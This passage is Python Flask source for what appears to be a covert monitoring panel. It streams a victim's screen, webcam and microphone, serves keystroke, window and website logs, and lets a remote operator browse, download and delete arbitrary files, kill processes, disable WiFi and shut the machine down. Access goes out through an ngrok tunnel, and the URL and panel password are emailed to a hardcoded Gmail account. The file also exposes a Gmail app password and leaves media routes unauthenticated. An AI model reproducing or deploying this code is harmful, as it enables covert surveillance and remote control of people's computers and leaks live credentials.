        labels = [app for app, _ in sorted_apps]
        data = [round(seconds/60, 1) for _, seconds in sorted_apps]  # Convert to minutes
        
        return jsonify({
            'labels': labels,
            'data': data
        })
    except Exception as e:
        logger.error(f"Error getting app usage data: {str(e)}")
        return jsonify({
            'labels': [],
            'data': []
        })

@app.route('/api/dashboard/recent_activity')
@login_required
def api_dashboard_recent_activity():
    """Get recent activity for timeline"""
    try:
        activities = []
        
        # Get recent window activity
        try:
            with open('logs/window_log.txt', 'r', encoding='utf-8') as f:
                for line in f:
                    if '[' in line and ']' in line:
                        timestamp = line[line.find('[')+1:line.find(']')]
                        activity = line[line.find(']')+1:].strip()
                        activities.append({
                            'type': 'window',
                            'timestamp': timestamp,
                            'details': activity
                        })
        except:
            pass
        
        # Get recent website visits
        try:
            with open('logs/website_log.txt', 'r', encoding='utf-8') as f:
                for line in f:
                    if '[' in line and ']' in line:
                        timestamp = line[line.find('[')+1:line.find(']')]
                        if ' - ' in line:
                            browser, website = line[line.find(']')+1:].strip().split(' - ', 1)
                            activities.append({
                                'type': 'website',
                                'timestamp': timestamp,
                                'details': f"Visited {website} using {browser}"
                            })
        except:
            pass
        
        # Sort by timestamp and get latest 20
        activities.sort(key=lambda x: x['timestamp'], reverse=True)
        activities = activities[:20]
        
        return jsonify({'activities': activities})
    except Exception as e:
        logger.error(f"Error getting recent activity: {str(e)}")
        return jsonify({'activities': []})

@app.route('/api/ngrok/status')
@login_required
def get_ngrok_status():
    """Get ngrok tunnel status"""
    try:
        if not ngrok_tunnel:
            return jsonify({
                'status': 'not_configured',
                'message': 'Ngrok not configured'
            })
        
        is_healthy = ngrok_tunnel.is_healthy() if hasattr(ngrok_tunnel, 'is_healthy') else True
        
        return jsonify({
            'status': 'healthy' if is_healthy else 'unhealthy',
            'url': ngrok_tunnel.public_url if ngrok_tunnel else None,
            'message': 'Tunnel is working' if is_healthy else 'Tunnel may be down'
        })
    except Exception as e:
        return jsonify({
            'status': 'error',
            'message': str(e)
        }), 500

# ==================== SYSTEM CONTROL API ROUTES ====================

@app.route('/api/system/status')
@login_required
def get_system_status():
    """Get system status information"""
    try:
        import psutil
        
        # Get system information
        cpu_percent = psutil.cpu_percent(interval=1)
        memory = psutil.virtual_memory()
        disk = psutil.disk_usage('/')
        
        # Get running processes count
        process_count = len(psutil.pids())
        
        # Get network information
        network = psutil.net_io_counters()
        
        # Get boot time
        boot_time = datetime.fromtimestamp(psutil.boot_time())
        uptime = datetime.now() - boot_time
        
        status = {
            'cpu_percent': cpu_percent,
            'memory_percent': memory.percent,
            'memory_used_gb': round(memory.used / (1024**3), 2),
            'memory_total_gb': round(memory.total / (1024**3), 2),
            'disk_percent': disk.percent,
            'disk_used_gb': round(disk.used / (1024**3), 2),
            'disk_total_gb': round(disk.total / (1024**3), 2),
            'process_count': process_count,
            'network_sent_mb': round(network.bytes_sent / (1024**2), 2),
            'network_recv_mb': round(network.bytes_recv / (1024**2), 2),
            'uptime_hours': round(uptime.total_seconds() / 3600, 2),
            'boot_time': boot_time.strftime('%Y-%m-%d %H:%M:%S')
        }
        
        return jsonify({'success': True, 'status': status})
    except Exception as e:
        logger.error(f"Error getting system status: {str(e)}")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/system/restart', methods=['POST'])
@login_required
@password_required
def system_restart():
    """Restart the system"""
    try:
        logger.info("Remote restart command received")
        # Log the action
        with open(os.path.join('logs', 'remote_control_log.txt'), 'a') as f:
            f.write(f"[{datetime.now()}] Remote restart command executed\n")
        
        # Execute restart command
        subprocess.run(['shutdown', '/r', '/t', '30'], shell=True)
        return jsonify({'success': True, 'message': 'System will restart in 30 seconds'})
    except Exception as e:
        logger.error(f"Error in remote restart: {str(e)}")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/system/poweroff', methods=['POST'])
@login_required
@password_required
def system_poweroff():
    """Power off the system"""
    try:
        logger.info("Remote power off command received")
        # Log the action
        with open(os.path.join('logs', 'remote_control_log.txt'), 'a') as f:
            f.write(f"[{datetime.now()}] Remote power off command executed\n")
        
        # Execute power off command
        subprocess.run(['shutdown', '/s', '/t', '30'], shell=True)
        return jsonify({'success': True, 'message': 'System will power off in 30 seconds'})
    except Exception as e:
        logger.error(f"Error in remote power off: {str(e)}")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/system/sleep', methods=['POST'])
@login_required
@password_required
def system_sleep():
    """Put system to sleep"""
    try:
        logger.info("Remote sleep command received")
        # Log the action
        with open(os.path.join('logs', 'remote_control_log.txt'), 'a') as f:
            f.write(f"[{datetime.now()}] Remote sleep command executed\n")
        
        # Execute sleep command
        subprocess.run(['powercfg', '/hibernate', 'off'], shell=True)  # Disable hibernate first
        subprocess.run(['rundll32.exe', 'powrprof.dll,SetSuspendState', '0,1,0'], shell=True)
        return jsonify({'success': True, 'message': 'System going to sleep'})
    except Exception as e:
        logger.error(f"Error in remote sleep: {str(e)}")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/system/logout', methods=['POST'])
@login_required
@password_required
def system_logout():
    """Force logout current user"""
    try:
        logger.info("Remote logout command received")
        # Log the action
        with open(os.path.join('logs', 'remote_control_log.txt'), 'a') as f:
            f.write(f"[{datetime.now()}] Remote logout command executed\n")
        
        # Execute logout command
        subprocess.run(['shutdown', '/l'], shell=True)
        return jsonify({'success': True, 'message': 'User logged out'})
    except Exception as e:
        logger.error(f"Error in remote logout: {str(e)}")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/system/lock', methods=['POST'])
@login_required
@password_required
def system_lock():
    """Lock the system"""
    try:
        logger.info("Remote lock command received")
        # Log the action
        with open(os.path.join('logs', 'remote_control_log.txt'), 'a') as f:
            f.write(f"[{datetime.now()}] Remote lock command executed\n")
        
        # Create lock flag file for overlay to detect
        lock_flag_file = os.path.join('logs', 'lock_system.flag')
        with open(lock_flag_file, 'w') as f:
            f.write('locked')
        
        # Start system lock overlay
        try:
            subprocess.Popen([sys.executable, 'system_lock_overlay.py'], 
                           creationflags=subprocess.CREATE_NO_WINDOW)
        except:
            # Fallback to Windows lock
            subprocess.run(['rundll32.exe', 'user32.dll,LockWorkStation'], shell=True)
        
        return jsonify({'success': True, 'message': 'System locked'})
    except Exception as e:
        logger.error(f"Error in remote lock: {str(e)}")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/system/unlock', methods=['POST'])
@login_required
@password_required
def system_unlock():
    """Unlock the system"""
    try:
        logger.info("Remote unlock command received")
        # Log the action
        with open(os.path.join('logs', 'remote_control_log.txt'), 'a') as f:
            f.write(f"[{datetime.now()}] Remote unlock command executed\n")
        
        # Create unlock flag file for overlay to detect
        unlock_flag_file = os.path.join('logs', 'unlock_system.flag')
        with open(unlock_flag_file, 'w') as f:
            f.write('unlocked')
        
        # Remove lock flag
        lock_flag_file = os.path.join('logs', 'lock_system.flag')
        if os.path.exists(lock_flag_file):
            os.remove(lock_flag_file)
        
        return jsonify({'success': True, 'message': 'System unlocked'})
    except Exception as e:
        logger.error(f"Error in remote unlock: {str(e)}")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/system/killwifi', methods=['POST'])
@login_required
@password_required
def kill_wifi():
    """Kill WiFi connection"""
    try:
        logger.info("Remote WiFi kill command received")
        # Log the action
        with open(os.path.join('logs', 'remote_control_log.txt'), 'a') as f:
            f.write(f"[{datetime.now()}] Remote WiFi kill command executed\n")
        
        # Try multiple methods to disable WiFi
        success = False
        
        # Method 1: Disable WiFi interface
        try:
            result = subprocess.run(['netsh', 'interface', 'set', 'interface', 'Wi-Fi', 'disable'], 
                                  capture_output=True, text=True, shell=True, timeout=10)
            if result.returncode == 0:
                success = True
                logger.info("WiFi disabled using netsh interface method")
        except Exception as e:
            logger.warning(f"Method 1 failed: {str(e)}")
        
        # Method 2: Disable WiFi adapter using device manager
        if not success:
            try:
                result = subprocess.run([
                    'powershell', '-Command', 
                    'Get-NetAdapter -Name "Wi-Fi" | Disable-NetAdapter -Confirm:$false'
                ], capture_output=True, text=True, shell=True, timeout=10)
                if result.returncode == 0:
                    success = True
                    logger.info("WiFi disabled using PowerShell method")
            except Exception as e:
                logger.warning(f"Method 2 failed: {str(e)}")
        
        # Method 3: Disable all wireless adapters
        if not success:
            try:
                result = subprocess.run([
                    'powershell', '-Command', 
                    'Get-NetAdapter | Where-Object {$_.InterfaceDescription -like "*Wireless*" -or $_.Name -like "*Wi-Fi*"} | Disable-NetAdapter -Confirm:$false'
                ], capture_output=True, text=True, shell=True, timeout=10)
                if result.returncode == 0:
                    success = True
                    logger.info("WiFi disabled using wireless adapter method")
            except Exception as e:
                logger.warning(f"Method 3 failed: {str(e)}")
        
        if success:
            return jsonify({'success': True, 'message': 'WiFi disabled successfully'})
        else:
            return jsonify({'success': False, 'error': 'Failed to disable WiFi using all methods'}), 500
            
    except Exception as e:
        logger.error(f"Error killing WiFi: {str(e)}")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/system/enablewifi', methods=['POST'])
@login_required
@password_required
def enable_wifi():
    """Enable WiFi connection"""
    try:
        logger.info("Remote WiFi enable command received")
        # Log the action
        with open(os.path.join('logs', 'remote_control_log.txt'), 'a') as f:
            f.write(f"[{datetime.now()}] Remote WiFi enable command executed\n")
        
        # Try multiple methods to enable WiFi
        success = False
        
        # Method 1: Enable WiFi interface
        try:
            result = subprocess.run(['netsh', 'interface', 'set', 'interface', 'Wi-Fi', 'enable'], 
                                  capture_output=True, text=True, shell=True, timeout=10)
            if result.returncode == 0:
                success = True
                logger.info("WiFi enabled using netsh interface method")
        except Exception as e:
            logger.warning(f"Method 1 failed: {str(e)}")
        
        # Method 2: Enable WiFi adapter using device manager
        if not success:
            try:
                result = subprocess.run([
                    'powershell', '-Command', 
                    'Get-NetAdapter -Name "Wi-Fi" | Enable-NetAdapter -Confirm:$false'
                ], capture_output=True, text=True, shell=True, timeout=10)
                if result.returncode == 0:
                    success = True
                    logger.info("WiFi enabled using PowerShell method")
            except Exception as e:
                logger.warning(f"Method 2 failed: {str(e)}")
        
        # Method 3: Enable all wireless adapters
        if not success:
            try:
                result = subprocess.run([
                    'powershell', '-Command', 
                    'Get-NetAdapter | Where-Object {$_.InterfaceDescription -like "*Wireless*" -or $_.Name -like "*Wi-Fi*"} | Enable-NetAdapter -Confirm:$false'
                ], capture_output=True, text=True, shell=True, timeout=10)
                if result.returncode == 0:
                    success = True
                    logger.info("WiFi enabled using wireless adapter method")
            except Exception as e:
                logger.warning(f"Method 3 failed: {str(e)}")
        
        if success:
            return jsonify({'success': True, 'message': 'WiFi enabled successfully'})
        else:
            return jsonify({'success': False, 'error': 'Failed to enable WiFi using all methods'}), 500
            
    except Exception as e:
        logger.error(f"Error enabling WiFi: {str(e)}")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/system/processes')
@login_required
def get_processes():
    """Get list of running processes"""
    try:
        import psutil
        
        processes = []
        for proc in psutil.process_iter(['pid', 'name', 'cpu_percent', 'memory_percent', 'status']):
            try:
                proc_info = proc.info
                if proc_info['cpu_percent'] > 0 or proc_info['memory_percent'] > 0:
                    processes.append({
                        'pid': proc_info['pid'],
                        'name': proc_info['name'],
                        'cpu_percent': round(proc_info['cpu_percent'], 1),
                        'memory_percent': round(proc_info['memory_percent'], 1),
                        'status': proc_info['status']
                    })
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                continue
        
        # Sort by CPU usage
        processes.sort(key=lambda x: x['cpu_percent'], reverse=True)
        
        return jsonify({'success': True, 'processes': processes[:50]})  # Return top 50
    except Exception as e:
        logger.error(f"Error getting processes: {str(e)}")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/system/killprocess', methods=['POST'])
@login_required
@password_required
def kill_process():
    """Kill a specific process"""
    try:
        data = request.get_json()
        pid = data.get('pid')
        
        if not pid:
            return jsonify({'success': False, 'error': 'PID is required'}), 400
        
        logger.info(f"Remote kill process command received for PID: {pid}")
        # Log the action
        with open(os.path.join('logs', 'remote_control_log.txt'), 'a') as f:
            f.write(f"[{datetime.now()}] Remote kill process command executed for PID: {pid}\n")
        
        # Kill the process
        import psutil
        process = psutil.Process(pid)
        process.terminate()
        
        return jsonify({'success': True, 'message': f'Process {pid} terminated'})
    except Exception as e:
        logger.error(f"Error killing process: {str(e)}")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/system/blockapp', methods=['POST'])
@login_required
@password_required
def block_application():
    """Block an application"""
    try:
        data = request.get_json()
        app_name = data.get('app_name')
        
        if not app_name:
            return jsonify({'success': False, 'error': 'Application name is required'}), 400
        
        logger.info(f"Remote block application command received: {app_name}")
        # Log the action
        with open(os.path.join('logs', 'remote_control_log.txt'), 'a') as f:
            f.write(f"[{datetime.now()}] Remote block application command executed: {app_name}\n")
        
        # Add to blocked apps list
        blocked_apps_file = os.path.join('logs', 'blocked_apps.json')
        blocked_apps = []
        
        if os.path.exists(blocked_apps_file):
            with open(blocked_apps_file, 'r') as f:
                blocked_apps = json.load(f)
        
        if app_name not in blocked_apps:
            blocked_apps.append(app_name)
            
        with open(blocked_apps_file, 'w') as f:
            json.dump(blocked_apps, f)
        
        return jsonify({'success': True, 'message': f'Application {app_name} blocked'})
    except Exception as e:
        logger.error(f"Error blocking application: {str(e)}")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/system/unblockapp', methods=['POST'])
@login_required
@password_required
def unblock_application():
    """Unblock an application"""
    try:
        data = request.get_json()
        app_name = data.get('app_name')
        
        if not app_name:
            return jsonify({'success': False, 'error': 'Application name is required'}), 400
        
        logger.info(f"Remote unblock application command received: {app_name}")
        # Log the action
        with open(os.path.join('logs', 'remote_control_log.txt'), 'a') as f:
            f.write(f"[{datetime.now()}] Remote unblock application command executed: {app_name}\n")
        
        # Remove from blocked apps list
        blocked_apps_file = os.path.join('logs', 'blocked_apps.json')
        blocked_apps = []
        
        if os.path.exists(blocked_apps_file):
            with open(blocked_apps_file, 'r') as f:
                blocked_apps = json.load(f)
        
        if app_name in blocked_apps:
            blocked_apps.remove(app_name)
            
        with open(blocked_apps_file, 'w') as f:
            json.dump(blocked_apps, f)
        
        return jsonify({'success': True, 'message': f'Application {app_name} unblocked'})
    except Exception as e:
        logger.error(f"Error unblocking application: {str(e)}")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/system/blockedapps')
@login_required
def get_blocked_apps():
    """Get list of blocked applications"""
    try:
        blocked_apps_file = os.path.join('logs', 'blocked_apps.json')
        blocked_apps = []
        
        if os.path.exists(blocked_apps_file):
            with open(blocked_apps_file, 'r') as f:
                blocked_apps = json.load(f)
        
        return jsonify({'success': True, 'apps': blocked_apps})
    except Exception as e:
        logger.error(f"Error getting blocked apps: {str(e)}")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/system/files')
@login_required
def list_files():
    """List files in a directory"""
    try:
        path = request.args.get('path', os.path.expanduser('~'))
        
        if not os.path.exists(path):
            return jsonify({'success': False, 'error': 'Path does not exist'}), 404
        
        files = []
        directories = []
        
        try:
            for item in os.listdir(path):
                item_path = os.path.join(path, item)
                try:
                    stat = os.stat(item_path)
                    item_info = {
                        'name': item,
                        'path': item_path,
                        'size': stat.st_size,
                        'modified': datetime.fromtimestamp(stat.st_mtime).strftime('%Y-%m-%d %H:%M:%S'),
                        'is_dir': os.path.isdir(item_path)
                    }
                    
                    if os.path.isdir(item_path):
                        directories.append(item_info)
                    else:
                        files.append(item_info)
                except (OSError, PermissionError):
                    continue
            
            # Sort directories first, then files
            directories.sort(key=lambda x: x['name'].lower())
            files.sort(key=lambda x: x['name'].lower())
            
            return jsonify({
                'success': True, 
                'current_path': path,
                'directories': directories,
                'files': files
            })
        except PermissionError:
            return jsonify({'success': False, 'error': 'Access denied'}), 403
            
    except Exception as e:
        logger.error(f"Error listing files: {str(e)}")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/system/download')
@login_required
def download_file():
    """Download a file"""
    try:
        file_path = request.args.get('path')
        
        if not file_path or not os.path.exists(file_path):
            return jsonify({'success': False, 'error': 'File not found'}), 404
        
        # Log the download
        logger.info(f"Remote file download: {file_path}")
        with open(os.path.join('logs', 'remote_control_log.txt'), 'a') as f:
            f.write(f"[{datetime.now()}] Remote file download: {file_path}\n")
        
        return send_from_directory(
            os.path.dirname(file_path),
            os.path.basename(file_path),
            as_attachment=True
        )
    except Exception as e:
        logger.error(f"Error downloading file: {str(e)}")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/system/delete', methods=['POST'])
@login_required
@password_required
def delete_file():
    """Delete a file or directory"""
    try:
        data = request.get_json()
        path = data.get('path')
        
        if not path or not os.path.exists(path):
            return jsonify({'success': False, 'error': 'Path does not exist'}), 404
        
        logger.info(f"Remote delete command received: {path}")
        # Log the action
        with open(os.path.join('logs', 'remote_control_log.txt'), 'a') as f:
            f.write(f"[{datetime.now()}] Remote delete command executed: {path}\n")
        
        if os.path.isdir(path):
            shutil.rmtree(path)
            message = f'Directory {path} deleted'
        else:
            os.remove(path)
            message = f'File {path} deleted'
        
        return jsonify({'success': True, 'message': message})
    except Exception as e:
        logger.error(f"Error deleting file: {str(e)}")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/dashboard/latest_captures')
@login_required
def api_dashboard_latest_captures():
    """Get latest screenshots and webcam captures"""
    try:
        captures = []
        
        # Get latest screenshots
        screenshots_dir = os.path.join('logs', 'screenshots')
        if os.path.exists(screenshots_dir):
            screenshots = []
            for filename in os.listdir(screenshots_dir):
                if filename.endswith(('.png', '.jpg')):
                    path = os.path.join('static', 'screenshots', filename)
                    timestamp = filename.replace('screenshot_', '').replace('.png', '').replace('.jpg', '')
                    try:
                        dt = datetime.strptime(timestamp, '%Y%m%d_%H%M%S')
                        screenshots.append({
                            'type': 'screenshot',
                            'url': path,
                            'timestamp': dt.strftime('%Y-%m-%d %H:%M:%S')
                        })
                    except:
                        continue
            screenshots.sort(key=lambda x: x['timestamp'], reverse=True)
            captures.extend(screenshots[:5])
        
        # Get latest webcam captures
        webcam_dir = 'WebcamLogs'
        if os.path.exists(webcam_dir):
            webcam_captures = []
            for filename in os.listdir(webcam_dir):
                if filename.endswith(('.jpg', '.png')):
                    path = os.path.join('static', 'webcam', filename)
                    timestamp = filename.replace('capture_', '').replace('.jpg', '').replace('.png', '')
                    try:
                        dt = datetime.strptime(timestamp, '%Y-%m-%d_%H-%M-%S')
                        webcam_captures.append({
                            'type': 'webcam',
                            'url': path,
                            'timestamp': dt.strftime('%Y-%m-%d %H:%M:%S')
                        })
                    except:
                        continue
            webcam_captures.sort(key=lambda x: x['timestamp'], reverse=True)
            captures.extend(webcam_captures[:5])
        
        # Sort all captures by timestamp
        captures.sort(key=lambda x: x['timestamp'], reverse=True)
        captures = captures[:10]
        
        return jsonify({'captures': captures})
    except Exception as e:
        logger.error(f"Error getting latest captures: {str(e)}")
        return jsonify({'captures': []})

@app.route('/api/audio/devices')
@login_required
def get_audio_devices():
    """Get available audio input devices"""
    if not audio_monitor:
        return jsonify({'devices': []})
    devices = audio_monitor.get_available_devices()
    return jsonify({'devices': devices})

@app.route('/api/audio/device', methods=['POST'])
@login_required
def set_audio_device():
    """Set audio input device"""
    if not audio_monitor:
        return "Audio monitor not initialized", 500
    
    data = request.get_json()
    device_index = data.get('device_index')
    if device_index is None:
        return "Device index required", 400
        
    success = audio_monitor.set_device(device_index)
    return jsonify({'success': success})

@app.route('/api/audio/level')
@login_required
def get_audio_level():
    """Get current audio input level"""
    if not audio_monitor:
        return jsonify({'level': 0})
    level = audio_monitor.get_audio_level()
    return jsonify({'level': level})

@app.route('/api/audio/toggle', methods=['POST'])
@login_required
def toggle_audio():
    """Toggle audio recording"""
    if not audio_monitor:
        return "Audio monitor not initialized", 500
        
    data = request.get_json()
    enabled = data.get('enabled', False)
    
    if enabled:
        success = audio_monitor.start_recording()
    else:
        audio_monitor.stop_recording()
        success = True
        
    return jsonify({'success': success})

@app.route('/live/screen_feed')
@login_required
def screen_feed():
    """Stream screen feed"""
    if not live_monitor:
        return "Live monitor not initialized", 500
    return Response(
        live_monitor.generate_screen_frames(),
        mimetype='multipart/x-mixed-replace; boundary=frame'
    )

@app.route('/live/camera_feed')
@login_required
def camera_feed():
    """Stream webcam feed"""
    if not live_monitor:
        return "Live monitor not initialized", 500
    return Response(
        live_monitor.generate_camera_frames(),
        mimetype='multipart/x-mixed-replace; boundary=frame'
    )

@app.route('/api/camera/toggle', methods=['POST'])
@login_required
def toggle_camera():
    """Toggle camera feed on/off"""
    if not live_monitor:
        return jsonify({'success': False, 'error': 'Live monitor not initialized'}), 500
    try:
        data = request.get_json()
        enabled = data.get('enabled', False)
        success = live_monitor.set_camera_enabled(enabled)
        return jsonify({'success': success})
    except Exception as e:
        logger.error(f"Error toggling camera: {str(e)}")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/static/screenshots/<path:filename>')
def serve_screenshot(filename):
    """Serve screenshot files with proper MIME type"""
    try:
        screenshot_dir = os.path.join('logs', 'screenshots')
        if not os.path.exists(os.path.join(screenshot_dir, filename)):
            return "File not found", 404
        return send_from_directory(screenshot_dir, filename, mimetype='image/png')
    except Exception as e:
        print(f"Error serving screenshot {filename}: {str(e)}")
        return "Error serving file", 500

@app.route('/static/webcam/<path:filename>')
def serve_webcam(filename):
    """Serve webcam files with proper MIME type"""
    try:
        webcam_dir = 'WebcamLogs'
        if not os.path.exists(os.path.join(webcam_dir, filename)):
            return "File not found", 404
        return send_from_directory(webcam_dir, filename, mimetype='image/jpeg')
    except Exception as e:
        print(f"Error serving webcam {filename}: {str(e)}")
        return "Error serving file", 500

def start_flask(host, port):
    """Start Flask server with proper network binding"""
    try:
        # Enable threaded mode and bind to all interfaces (0.0.0.0)
        # This ensures the server is accessible from both local network and ngrok
        app.run(
            host='0.0.0.0',  # Bind to all available interfaces
            port=port,
            debug=False,
            use_reloader=False,
            threaded=True,
            processes=1
        )
    except Exception as e:
        logger.error(f"Failed to start server on {host}:{port} - {str(e)}")
        try:
            # Try localhost as fallback
            app.run(
                host='127.0.0.1',
                port=port,
                debug=False,
                use_reloader=False,
                threaded=True,
                processes=1
            )
        except Exception as e:
            logger.error(f"Failed to start server on localhost: {str(e)}")

def send_ngrok_failure_email(config, local_ips):
    """Send email notification when ngrok fails"""
    try:
        print("\n📧 Sending ngrok failure notification...")
        
        # Create message
        msg = MIMEMultipart()
        msg['From'] = EMAIL_CONFIG['sender_email']
        msg['To'] = EMAIL_CONFIG['notification_email']
        msg['Subject'] = f"⚠️ Ngrok Tunnel Failed - {config['username']}"

        # Create email body with HTML formatting
        body = f"""
<html>
<body style="font-family: Arial, sans-serif; line-height: 1.6;">
    <h2 style="color: #e74c3c;">⚠️ Ngrok Tunnel Failure Alert</h2>
    <hr>
    
    <h3 style="color: #34495e;">Monitor Information:</h3>
    <ul>
        <li><strong>Monitor Name:</strong> {config['username']}</li>
        <li><strong>Failure Time:</strong> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</li>
    </ul>

    <h3 style="color: #34495e;">Status:</h3>
    <div style="background-color: #fdf2f2; padding: 15px; border-radius: 5px; border-left: 4px solid #e74c3c;">
        <p><strong>Remote Access:</strong> <span style="color: #e74c3c;">FAILED</span></p>
        <p>The ngrok tunnel has stopped working and could not be restarted automatically.</p>
    </div>

    <h3 style="color: #34495e;">Local Access (Still Available):</h3>
    <div style="background-color: #f8f9fa; padding: 15px; border-radius: 5px;">
        <p><strong>Local Access:</strong><br>
        <span style="color: #2980b9;">http://localhost:{config['port']}</span></p>
    </div>

    <h3 style="color: #34495e;">Other Network Addresses:</h3>
    <div style="background-color: #f8f9fa; padding: 15px; border-radius: 5px;">
        {'<br>'.join([f'<span style="color: #2980b9;">http://{ip}:{config["port"]}</span>' for ip in local_ips if not ip.startswith('127.')])}
    </div>

    <h3 style="color: #34495e;">Action Required:</h3>
    <ul style="color: #7f8c8d;">
        <li>Check if the monitor application is still running</li>
        <li>Restart the monitor application if needed</li>
        <li>Check Windows Defender settings for ngrok exclusions</li>
    </ul>

    <hr>
    <p style="color: #95a5a6; font-size: 12px;">Powered by Mango Tree Technology</p>
</body>
</html>
"""

        # Attach HTML body
        msg.attach(MIMEText(body, 'html'))

        # Send with retries
        max_retries = 3
        for attempt in range(max_retries):
            try:
                print(f"  Sending failure notification (attempt {attempt + 1}/{max_retries})...")
                
                # Connect to SMTP server with SSL from the start
                server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
                
                # Login with exact credentials
                server.login(
                    EMAIL_CONFIG['sender_email'],
                    EMAIL_CONFIG['app_password']
                )
                
                # Send email
                server.send_message(msg)
                server.quit()
                
                print("✓ Ngrok failure notification sent successfully!")
                return True
                
            except Exception as e:
                print(f"✗ Email attempt {attempt + 1} failed: {str(e)}")
                if attempt < max_retries - 1:
                    print("  Retrying in 2 seconds...")
                    time.sleep(2)
                else:
                    print("✗ All email attempts failed")
                    return False
        
        return False

    except Exception as e:
        print(f"✗ Failed to send failure notification: {str(e)}")
        return False

def send_monitor_email(config, ngrok_url, local_ips):
    """Send monitor details email with access URLs"""
    try:
        print("\n📧 Sending access details email...")
        
        # Create message
        msg = MIMEMultipart()
        msg['From'] = EMAIL_CONFIG['sender_email']
        msg['To'] = EMAIL_CONFIG['notification_email']
        msg['Subject'] = f"Monitor Access Details - {config['username']}"

        # Create email body with HTML formatting
        body = f"""
<html>
<body style="font-family: Arial, sans-serif; line-height: 1.6;">
    <h2 style="color: #2c3e50;">Monitor Access Details</h2>
    <hr>
    
    <h3 style="color: #34495e;">Basic Information:</h3>
    <ul>
        <li><strong>Monitor Name:</strong> {config['username']}</li>
        <li><strong>Start Time:</strong> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</li>
    </ul>

    <h3 style="color: #34495e;">Access URLs:</h3>
    <div style="background-color: #f8f9fa; padding: 15px; border-radius: 5px;">
        <p><strong>Remote Access</strong> (Works from anywhere):<br>
        <span style="color: #2980b9;">{ngrok_url if ngrok_url else 'Remote access not available'}</span></p>

        <p><strong>Local Access:</strong><br>
        <span style="color: #2980b9;">http://localhost:{config['port']}</span></p>
    </div>

    <h3 style="color: #34495e;">Other Network Addresses:</h3>
    <div style="background-color: #f8f9fa; padding: 15px; border-radius: 5px;">
        {'<br>'.join([f'<span style="color: #2980b9;">http://{ip}:{config["port"]}</span>' for ip in local_ips if not ip.startswith('127.')])}
    </div>

    <h3 style="color: #34495e;">Login Information:</h3>
    <div style="background-color: #f8f9fa; padding: 15px; border-radius: 5px;">
        <p><strong>Password:</strong> happykutta</p>
    </div>

    <h3 style="color: #34495e;">Important Notes:</h3>
    <ul style="color: #7f8c8d;">
        <li>Remote access URL will change if monitor is restarted</li>
        <li>Local access URLs only work when on the same network</li>
        <li>Use Chrome, Firefox, or Edge browser</li>
    </ul>

    <hr>
    <p style="color: #95a5a6; font-size: 12px;">Powered by Mango Tree Technology</p>
</body>
</html>
"""

        # Attach HTML body
        msg.attach(MIMEText(body, 'html'))

        # Send with retries
        max_retries = 3
        for attempt in range(max_retries):
            try:
                print(f"  Sending email (attempt {attempt + 1}/{max_retries})...")
                
                # Connect to SMTP server with SSL from the start
                server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
                
                # Login with exact credentials
                server.login(
                    EMAIL_CONFIG['sender_email'],
                    EMAIL_CONFIG['app_password']
                )
                
                # Send email
                server.send_message(msg)
                server.quit()
                
                print("✓ Access details email sent successfully!")
                print(f"  Check {EMAIL_CONFIG['notification_email']} for access details")
                return True
                
            except Exception as e:
                print(f"✗ Email attempt {attempt + 1} failed: {str(e)}")
                if attempt < max_retries - 1:
                    print("  Retrying in 2 seconds...")
                    time.sleep(2)
                else:
                    print("✗ All email attempts failed")
                    print("  Please check your email settings:")
                    print(f"  - Sender: {EMAIL_CONFIG['sender_email']}")
                    print(f"  - App Password: {EMAIL_CONFIG['app_password'][:4]}...{EMAIL_CONFIG['app_password'][-4:]}")
                    return False
        
        return False

    except Exception as e:
        print(f"✗ Failed to send email: {str(e)}")
        return False

# Email configuration
EMAIL_CONFIG = {
    'notification_email': 'getinfomonitor@gmail.com',  # Email that receives notifications
    'sender_email': 'monitorsend76@gmail.com',        # Email that sends notifications
    'app_password': 'tzmqlutxsiuzvaho'                # App password for sender email
}

def ensure_monitoring_files():
    """Create necessary log files and directories"""
    try:
        # Create logs directory
        if not os.path.exists('logs'):
            os.makedirs('logs')
        
        # Create required log files
        log_files = [
            'window_log.txt',
            'website_log.txt',
            'internet_log.txt',
            'app_usage_log.txt',
            'keystrokes_current.txt',
            'usb_activity_log.txt'
        ]
        
        for filename in log_files:
            filepath = os.path.join('logs', filename)
            if not os.path.exists(filepath):
                with open(filepath, 'w', encoding='utf-8') as f:
                    f.write('')
                print(f"Created log file: {filename}")
        
        # Create required directories
        directories = [
            os.path.join('logs', 'screenshots'),
            os.path.join('logs', 'audio'),
            'WebcamLogs',
            os.path.join('static', 'screenshots'),
            os.path.join('static', 'webcam')
        ]
        
        for directory in directories:
            if not os.path.exists(directory):
                os.makedirs(directory)
                print(f"Created directory: {directory}")
        
        # Copy existing screenshots to static directory for better serving
        try:
            screenshot_source = os.path.join('logs', 'screenshots')
            screenshot_static = os.path.join('static', 'screenshots')
            
            if os.path.exists(screenshot_source):
                for filename in os.listdir(screenshot_source):
                    if filename.endswith(('.png', '.jpg')):
                        source_path = os.path.join(screenshot_source, filename)
                        static_path = os.path.join(screenshot_static, filename)
                        if not os.path.exists(static_path):
                            shutil.copy2(source_path, static_path)
                            
            webcam_source = 'WebcamLogs'
            webcam_static = os.path.join('static', 'webcam')
            
            if os.path.exists(webcam_source):
                for filename in os.listdir(webcam_source):
